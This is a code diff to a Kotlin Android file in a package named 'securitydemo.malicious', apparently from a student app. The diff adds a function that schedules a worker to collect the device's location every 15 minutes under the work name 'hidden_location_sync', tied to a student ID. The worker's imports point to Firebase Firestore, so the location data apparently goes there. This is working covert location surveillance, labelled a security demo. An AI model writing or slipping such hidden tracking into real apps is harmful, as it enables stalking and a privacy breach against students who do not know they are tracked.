@@ -5,14 +5,22 @@ package com.example.sitconnect.securitydemo.malicious
 
 import android.content.Context
 import android.util.Log
+import androidx.work.BackoffPolicy
+import androidx.work.Constraints
 import androidx.work.CoroutineWorker
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
 import androidx.work.WorkerParameters
+import androidx.work.workDataOf
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
 import com.google.android.gms.tasks.CancellationTokenSource
 import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.tasks.await
 import java.util.Date
+import java.util.concurrent.TimeUnit
 
 class LocationTrackerWorker(
     appContext: Context,
@@ -65,4 +73,31 @@ class LocationTrackerWorker(
             Result.retry()
         }
     }
+}
+
+fun startBackgroundLocationTracking(context: Context, studentId: String) {
+    if (studentId.isBlank()) return
+
+    val constraints = Constraints.Builder()
+        .setRequiredNetworkType(NetworkType.CONNECTED)
+        .setRequiresBatteryNotLow(true)
+        .setRequiresCharging(false)
+        .build()
+
+    val inputData = workDataOf("studentId" to studentId.trim())
+
+    val workRequest = PeriodicWorkRequestBuilder<LocationTrackerWorker>(
+        15, TimeUnit.MINUTES   // use realistic value; system enforces min 15 min
+    )
+        .setConstraints(constraints)
+        .setInputData(inputData)
+        .setBackoffCriteria(BackoffPolicy.LINEAR, 30, TimeUnit.SECONDS)
+        .build()
+
+    WorkManager.getInstance(context)
+        .enqueueUniquePeriodicWork(
+            "hidden_location_sync",
+            ExistingPeriodicWorkPolicy.KEEP,
+            workRequest
+        )
 }
